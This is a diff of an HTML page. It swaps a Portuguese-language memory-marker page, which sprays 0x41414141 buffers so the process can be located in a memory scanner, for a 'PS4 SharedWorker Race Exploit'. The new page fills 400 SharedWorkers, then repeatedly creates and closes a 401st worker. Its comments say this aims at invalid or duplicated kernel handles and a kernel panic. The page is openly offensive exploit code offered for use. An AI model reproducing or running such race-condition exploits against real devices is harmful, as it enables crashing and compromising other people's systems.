@@ -1,45 +1,135 @@
 <!DOCTYPE html>
-<html lang="pt-BR">
+<html>
 <head>
     <meta charset="UTF-8">
-    <title>PROCESS HUNTER</title>
-    <style>
-        body { background: #000; color: #0f0; font-family: monospace; text-align: center; padding: 20px; }
-        button { padding: 20px 40px; font-size: 24px; background: #aa0000; color: #fff; border: 2px solid #f00; cursor: pointer; }
-        .big { font-size: 20px; font-weight: bold; margin: 20px; }
-    </style>
+    <title>PS4 SharedWorker Race Exploit (Corrected)</title>
 </head>
 <body>
 
-    <h1>CAÇADOR DE PROCESSOS</h1>
-    <p class="big">1. Olhe a lista de processos no Reaper.</p>
-    <p class="big">2. Clique no botão abaixo.</p>
-    <p class="big">3. Veja qual processo aumentou a RAM (+500MB).</p>
+    <h1>SharedWorker IPC Race (Target 400-401)</h1>
     
-    <button onclick="inflate_ram()">INFLAR MEMÓRIA (500MB)</button>
-    <div id="log"></div>
+    <div class="control-panel">
+        <p>
+            <label>1. Encher até (Base Segura): <input type="number" id="baseFill" value="400"></label>
+            <button id="btnFill" onclick="runFill()">ENCHER MEMÓRIA</button>
+        </p>
+        <p>
+            <label>2. Race Loop (Delay ms): <input type="number" id="raceDelay" value="0"></label>
+            <button id="btnRace" onclick="runRace()" disabled>INICIAR RACE (401º)</button>
+        </p>
+        <p>Status: <span id="status" class="highlight">Aguardando...</span></p>
+    </div>
+
+    <div id="log">Logs do sistema...</div>
 
     <script>
-        var huge_stash = [];
+        let workers = [];
+        let raceInterval = null;
+        let isRacing = false;
 
-        function inflate_ram() {
-            document.getElementById("log").innerText = "ALOCANDO 500MB... OLHE O REAPER!";
+        const logElement = document.getElementById('log');
+        const statusElement = document.getElementById('status');
+        const btnRace = document.getElementById('btnRace');
+        const btnFill = document.getElementById('btnFill');
+
+        function log(msg, type='') {
+            const time = new Date().toLocaleTimeString();
+            let color = type === 'error' ? 'red' : (type === 'warn' ? 'yellow' : '#0f0');
+            logElement.innerHTML = `<span style="color:${color}">[${time}] ${msg}</span><br>` + logElement.innerHTML;
+        }
+
+        // 1. Fase de Enchimento (Fill)
+        async function runFill() {
+            const target = parseInt(document.getElementById('baseFill').value);
+            btnFill.disabled = true;
+            statusElement.innerText = `Enchendo até ${target}...`;
+
+            // Enche em blocos para não travar a UI
+            let current = 0;
             
-            try {
-                // Aloca 50 blocos de 10MB cada = 500MB
-                // Preenche com "AAAA" (0x41414141) para facilitar a busca depois
-                for(var i=0; i<50; i++) {
-                    var buf = new ArrayBuffer(10 * 1024 * 1024); // 10MB
-                    var view = new Uint32Array(buf);
-                    view.fill(0x41414141); // AAAAAAAA
-                    huge_stash.push(buf);
+            function addBatch() {
+                const batchSize = 10;
+                for (let i = 0; i < batchSize; i++) {
+                    if (current >= target) break;
+                    try {
+                        // Nomes únicos para garantir alocação de nova estrutura IPC
+                        const id = "filler_" + current + "_" + Math.random();
+                        // Script vazio para minimizar uso de RAM do WebKit, focando no handle do Kernel
+                        const sw = new SharedWorker("data:text/javascript,onconnect=e=>{}", id);
+                        workers.push(sw);
+                        current++;
+                    } catch (e) {
+                        log(`Erro ao encher no índice ${current}: ${e.message}`, 'error');
+                        statusElement.innerText = "Falha no enchimento!";
+                        return; // Para se der erro (provavelmente atingiu o limite real)
+                    }
                 }
-                
-                document.getElementById("log").innerText += "\n\nFEITO! O PROCESSO DEVE TER CRESCIDO.";
-                document.getElementById("log").innerText += "\nAgora faça scan por '41 41 41 41' nesse processo.";
-            } catch(e) {
-                document.getElementById("log").innerText = "Erro: Falta de memória. (Isso também indica o processo certo!)";
+
+                if (current < target) {
+                    if (current % 50 === 0) log(`Alocados: ${current}/${target}...`);
+                    setTimeout(addBatch, 10); // Pausa para a UI respirar
+                } else {
+                    log(`Sucesso! ${current} workers base alocados. Estamos na borda.`, 'warn');
+                    statusElement.innerText = "Memória Cheia. Pronto para Race.";
+                    btnRace.disabled = false;
+                }
             }
+
+            addBatch();
+        }
+
+        // 2. Fase de Race Condition (Spray & Pray)
+        function runRace() {
+            if (isRacing) {
+                // Parar
+                clearInterval(raceInterval);
+                isRacing = false;
+                btnRace.innerText = "INICIAR RACE (401º)";
+                statusElement.innerText = "Race parada.";
+                log("Loop de Race interrompido.");
+                return;
+            }
+
+            const delay = parseInt(document.getElementById('raceDelay').value);
+            isRacing = true;
+            btnRace.innerText = "PARAR RACE";
+            statusElement.innerText = "EXECUTANDO RACE...";
+            log("Iniciando martelada no 401º slot...", 'warn');
+
+            let cycles = 0;
+
+            raceInterval = setInterval(() => {
+                cycles++;
+                const id = "race_" + Date.now() + "_" + cycles;
+                
+                try {
+                    // Tenta alocar o worker que seria o 401 (Instável)
+                    const sw = new SharedWorker("data:text/javascript,onconnect=e=>{}", id);
+                    
+                    // --- AQUI É O PULO DO GATO ---
+                    // Tentamos usar o objeto IMEDIATAMENTE.
+                    // Se o Kernel estiver confuso (instabilidade 401-403),
+                    // ele pode nos dar um handle inválido ou duplicado.
+                    sw.port.postMessage("ping"); 
+
+                    // Destruição imediata para tentar liberar o slot para o próximo ciclo
+                    // Isso força o Kernel a fazer free() e alloc() muito rápido no mesmo endereço
+                    sw.port.close();
+                    
+                    // Sobrescreve a variável para o GC marcar
+                    // (Não podemos deletar explicitamente em JS, mas perdemos a referência)
+                    
+                } catch (e) {
+                    // Se falhar a alocação (limite duro atingido), apenas logamos e continuamos tentando
+                    // O Panic geralmente acontece aqui quando o Kernel falha em lidar com o erro
+                    // log(`Falha de alocação no ciclo ${cycles} (Esperado): ${e.message}`, 'warn');
+                }
+
+                if (cycles % 200 === 0) {
+                    log(`Race ativa: ${cycles} ciclos no slot 401.`);
+                }
+
+            }, delay);
         }
     </script>
 </body>
